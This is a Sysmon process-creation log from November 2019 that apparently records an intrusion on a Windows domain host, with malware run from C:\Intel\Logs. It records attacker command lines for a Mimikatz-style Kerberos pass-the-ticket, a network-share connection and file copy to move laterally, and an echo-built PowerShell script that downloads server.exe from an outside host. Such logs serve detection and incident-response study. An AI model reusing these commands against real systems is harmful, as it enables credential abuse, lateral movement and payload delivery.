ProcessGuid: {02EA0504-5B49-5A01-0000-0010F3701200}
ProcessId: 480
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 16:05:46,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:05:46.233
ProcessGuid: {02EA0504-5B49-5A01-0000-0010A3721200}
ProcessId: 2368
Image: C:\Intel\Logs\mz.exe"
情報,2019/11/07 16:05:45,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:05:45.906
ProcessGuid: {02EA0504-5B49-5A01-0000-0010A3721200}
ProcessId: 2368
Image: C:\Intel\Logs\mz.exe
CommandLine: C:\Intel\Logs\mz.exe  ""kerberos::ptt C:\Intel\Logs\500.kirbi"" exit
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {02EA0504-41A6-5A01-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=53796614833D7596FF9F6BFD59E55D668089A00F
ParentProcessGuid: {02EA0504-5B49-5A01-0000-0010F3701200}
ParentProcessId: 480
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""kerberos::ptt C:\Intel\Logs\500.kirbi"" exit"""
情報,2019/11/07 16:05:45,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:05:45.906
ProcessGuid: {02EA0504-5B49-5A01-0000-001099711200}
ProcessId: 2840
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""-912563662-1694219468-18607700111342835083-34611020020195916431936073907706248025""
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {02EA0504-41A6-5A01-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A1-5A01-0000-00105F7E0000}
ParentProcessId: 360
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 16:05:45,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:05:45.890
ProcessGuid: {02EA0504-5B49-5A01-0000-0010F3701200}
ProcessId: 480
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""kerberos::ptt C:\Intel\Logs\500.kirbi"" exit""
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {02EA0504-41A6-5A01-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-584C-5A01-0000-0010E1C11000}
ParentProcessId: 2604
ParentImage: C:\Intel\Logs\win.exe
ParentCommandLine: C:\Intel\Logs\win.exe"
情報,2019/11/07 16:05:33,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:05:33.082
ProcessGuid: {02EA0504-5AEC-5A01-0000-0010D7521200}
ProcessId: 2428
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 16:05:06,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:05:06.453
ProcessGuid: {02EA0504-5AAA-5A01-0000-001019361200}
ProcessId: 2480
Image: C:\Windows\System32\taskhost.exe"
情報,2019/11/07 16:04:46,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:04:46.095
ProcessGuid: {02EA0504-5B0D-5A01-0000-0010896E1200}
ProcessId: 1584
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 16:04:46,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:04:46.095
ProcessGuid: {02EA0504-5B0D-5A01-0000-0010116E1200}
ProcessId: 2512
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 16:04:45,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:04:45.612
ProcessGuid: {02EA0504-5B0D-5A01-0000-0010896E1200}
ProcessId: 1584
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""-1174534734-1821659479112772375419703225462074958062874713166-110522937-1694144277""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 16:04:45,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:04:45.612
ProcessGuid: {02EA0504-5B0D-5A01-0000-0010116E1200}
ProcessId: 2512
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""klist purge""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 16:04:32,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 07:04:32.227
ProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ProcessId: 2736
Image: C:\Program Files\Internet Explorer\iexplore.exe
TargetFilename: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\DDJ5HEOK3F2XGEDD46MB.temp
CreationUtcTime: 2019-11-07 05:26:24.114
PreviousCreationUtcTime: 2019-11-07 07:04:32.227"
情報,2019/11/07 16:04:12,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:04:12.992
ProcessGuid: {02EA0504-5AEC-5A01-0000-0010D7521200}
ProcessId: 2428
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:2736 CREDAT:2561482 /prefetch:2
CurrentDirectory: C:\Users\chiyoda.tokyo.EXAMPLE\Desktop\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=7CB7EF5B277663E56167E1E7705D7C8BFC4BD432
ParentProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ParentProcessId: 2736
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 16:03:42,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:03:42.042
ProcessGuid: {02EA0504-5ACD-5A01-0000-0010C7501200}
ProcessId: 2120
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 16:03:42,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:03:42.026
ProcessGuid: {02EA0504-5ACD-5A01-0000-00104F501200}
ProcessId: 940
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 16:03:41,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:03:41.995
ProcessGuid: {02EA0504-5ACD-5A01-0000-0010C7501200}
ProcessId: 2120
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""-39282526-1693590144290073725-1186896156-19520291181139051761-14646583501067579457""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 16:03:41,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:03:41.995
ProcessGuid: {02EA0504-5ACD-5A01-0000-00104F501200}
ProcessId: 940
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""copy C:\Intel\Logs\server.exe \\Win7_64JP_03\c$\Intel\Logs\server.exe""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 16:03:24,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:03:24.148
ProcessGuid: {02EA0504-5ABB-5A01-0000-0010693C1200}
ProcessId: 2040
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 16:03:24,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:03:24.148
ProcessGuid: {02EA0504-5ABB-5A01-0000-0010C53B1200}
ProcessId: 1868
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 16:03:24,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:03:24.148
ProcessGuid: {02EA0504-5ABB-5A01-0000-0010CD3D1200}
ProcessId: 2740
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
情報,2019/11/07 16:03:23,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 07:03:23.868
ProcessGuid: {02EA0504-5ABB-5A01-0000-0010CD3D1200}
ProcessId: 2740
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\OQ0UQF0S9YUJHVVCRFZ7.temp
CreationUtcTime: 2019-11-07 06:56:55.351
PreviousCreationUtcTime: 2019-11-07 07:03:23.868"
情報,2019/11/07 16:03:23,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:03:23.680
ProcessGuid: {02EA0504-5ABB-5A01-0000-0010CD3D1200}
ProcessId: 2740
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell  -ExecutionPolicy ByPass -File C:\Intel\Logs\s.ps1
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D
ParentProcessGuid: {02EA0504-5ABB-5A01-0000-0010C53B1200}
ParentProcessId: 1868
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""powershell -ExecutionPolicy ByPass -File C:\Intel\Logs\s.ps1"""
情報,2019/11/07 16:03:23,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:03:23.665
ProcessGuid: {02EA0504-5ABB-5A01-0000-0010693C1200}
ProcessId: 2040
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""-1250139715-2118968734-219008841671603723-54436302-1884308137-1388269156-612763188""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 16:03:23,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:03:23.649
ProcessGuid: {02EA0504-5ABB-5A01-0000-0010C53B1200}
ProcessId: 1868
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""powershell -ExecutionPolicy ByPass -File C:\Intel\Logs\s.ps1""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 16:03:17,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:03:17.893
ProcessGuid: {02EA0504-5A22-5A01-0000-0010DFFE1100}
ProcessId: 2928
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 16:03:06,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:03:06.287
ProcessGuid: {02EA0504-5AAA-5A01-0000-001019361200}
ProcessId: 2480
Image: C:\Windows\System32\taskhost.exe
CommandLine: taskhost.exe $(Arg0)
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\LOCAL SERVICE
LogonGuid: {02EA0504-41A8-5A01-0000-0020E5030000}
LogonId: 0x3e5
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=1AB1E31FE9F3347F68B1EEE8FF02F525FC46CCC9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001033890000}
ParentProcessId: 504
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe"
情報,2019/11/07 16:02:17,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 07:02:17.022
ProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ProcessId: 2736
Image: C:\Program Files\Internet Explorer\iexplore.exe
TargetFilename: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\B4IMNBRQFGD0FNERUALL.temp
CreationUtcTime: 2019-11-07 05:26:24.114
PreviousCreationUtcTime: 2019-11-07 07:02:17.022"
情報,2019/11/07 16:01:51,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:01:51.079
ProcessGuid: {02EA0504-5A17-5A01-0000-001040DD1100}
ProcessId: 2496
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 16:01:14,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:01:14.217
ProcessGuid: {02EA0504-5A3A-5A01-0000-00101C1E1200}
ProcessId: 2660
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 16:01:14,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:01:14.217
ProcessGuid: {02EA0504-5A3A-5A01-0000-0010A21D1200}
ProcessId: 2356
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 16:01:14,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:01:14.201
ProcessGuid: {02EA0504-5A3A-5A01-0000-00101C1E1200}
ProcessId: 2660
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""-37292603884830950-1541952545-1325873766-791174336-1595050156557006363-1050758499""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 16:01:14,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:01:14.186
ProcessGuid: {02EA0504-5A3A-5A01-0000-0010A21D1200}
ProcessId: 2356
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""echo $p.DownloadFile(""http://anews-web.co/server.exe"", ""C:\Intel\Logs\server.exe"") >> C:\Intel\Logs\s.ps1""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 16:01:05,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 07:01:05.138
ProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ProcessId: 2736
Image: C:\Program Files\Internet Explorer\iexplore.exe
TargetFilename: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\ABMTIFDMHK849RDYKD0G.temp
CreationUtcTime: 2019-11-07 05:26:24.114
PreviousCreationUtcTime: 2019-11-07 07:01:05.138"
情報,2019/11/07 16:00:50,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:00:50.224
ProcessGuid: {02EA0504-5A22-5A01-0000-0010DFFE1100}
ProcessId: 2928
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:2736 CREDAT:3806590 /prefetch:2
CurrentDirectory: C:\Users\chiyoda.tokyo.EXAMPLE\Desktop\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=7CB7EF5B277663E56167E1E7705D7C8BFC4BD432
ParentProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ParentProcessId: 2736
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 16:00:39,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:00:39.616
ProcessGuid: {02EA0504-5A17-5A01-0000-001040DD1100}
ProcessId: 2496
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:2736 CREDAT:3282365 /prefetch:2
CurrentDirectory: C:\Users\chiyoda.tokyo.EXAMPLE\Desktop\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=7CB7EF5B277663E56167E1E7705D7C8BFC4BD432
ParentProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ParentProcessId: 2736
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 16:00:26,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:00:26.466
ProcessGuid: {02EA0504-596D-5A01-0000-001020681100}
ProcessId: 2616
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 16:00:14,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:00:14.797
ProcessGuid: {02EA0504-59FE-5A01-0000-0010EDD81100}
ProcessId: 2776
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 16:00:14,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:00:14.781
ProcessGuid: {02EA0504-59FE-5A01-0000-001076D81100}
ProcessId: 2556
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 16:00:14,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:00:14.703
ProcessGuid: {02EA0504-59FE-5A01-0000-0010EDD81100}
ProcessId: 2776
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""-1844709007-106598799717194406462052614953203673897-86878458-1567239742-969674247""
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {02EA0504-41A6-5A01-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A1-5A01-0000-00105F7E0000}
ParentProcessId: 360
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 16:00:14,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:00:14.703
ProcessGuid: {02EA0504-59FE-5A01-0000-001076D81100}
ProcessId: 2556
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""echo $p = New-Object System.Net.WebClient > C:\Intel\Logs\s.ps1""
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {02EA0504-41A6-5A01-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-584C-5A01-0000-0010E1C11000}
ParentProcessId: 2604
ParentImage: C:\Intel\Logs\win.exe
ParentCommandLine: C:\Intel\Logs\win.exe"
情報,2019/11/07 15:59:38,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:59:38.886
ProcessGuid: {02EA0504-59D9-5A01-0000-00104DD31100}
ProcessId: 2728
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:59:38,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:59:38.886
ProcessGuid: {02EA0504-59D9-5A01-0000-0010AAD21100}
ProcessId: 2172
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:59:38,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:59:38.886
ProcessGuid: {02EA0504-59D9-5A01-0000-0010A2D41100}
ProcessId: 2740
Image: C:\Windows\SysWOW64\net.exe"
情報,2019/11/07 15:59:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:59:37.903
ProcessGuid: {02EA0504-59D9-5A01-0000-0010A2D41100}
ProcessId: 2740
Image: C:\Windows\SysWOW64\net.exe
CommandLine: net  use \\Win7_64JP_03\c$
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=9A544E2094273741AA2D3E7EA0AF303AF2B587EA
ParentProcessGuid: {02EA0504-59D9-5A01-0000-0010AAD21100}
ParentProcessId: 2172
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""net use \\Win7_64JP_03\c$"""
情報,2019/11/07 15:59:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:59:37.856
ProcessGuid: {02EA0504-59D9-5A01-0000-00104DD31100}
ProcessId: 2728
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""-7283715361194128843-1333314503915176563-455055699-8492773121722851170242126619""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
